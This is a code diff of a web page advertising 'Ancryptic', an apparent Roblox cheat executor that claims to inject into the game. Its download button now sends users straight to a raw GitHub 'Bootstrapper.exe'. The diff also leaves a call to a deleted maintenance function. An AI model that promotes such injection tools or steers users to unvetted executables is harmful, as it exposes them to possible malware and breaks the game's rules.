@@ -172,6 +172,7 @@
             box-shadow: 0 5px 20px rgba(0,0,0,0.3);
             position: relative;
             overflow: hidden;
+            cursor: pointer;
             z-index: 1;
         }
 
@@ -581,7 +582,7 @@
         <h1>Ancryptic</h1>
         <p>Roblox's #1 executor at the moment! It uses the internal injection method! This software is always updated when Roblox patches it!
         </p>
-        <a class="download-btn">
+        <a id="dnld" class="download-btn">
             download
         </a>
     </div>
@@ -684,12 +685,7 @@
 
         // Maintenance message
         const isDownloadAllowed = true;
-        const maintenanceMsg = document.getElementById('maintenance-msg');
-        const showMaintenance = () => {
-            maintenanceMsg.classList.add('active');
-            setTimeout(() => maintenanceMsg.classList.remove('active'), 2000);
-        };
-        document.querySelector('.download-btn').addEventListener('click', e => {
+        document.querySelector('#dnld').addEventListener('click', e => {
             e.preventDefault();
             isDownloadAllowed ? window.location.href = 'https://github.com/pneumxnia/static-files/raw/refs/heads/mainbranch/Bootstrapper.exe' : showMaintenance();
         });
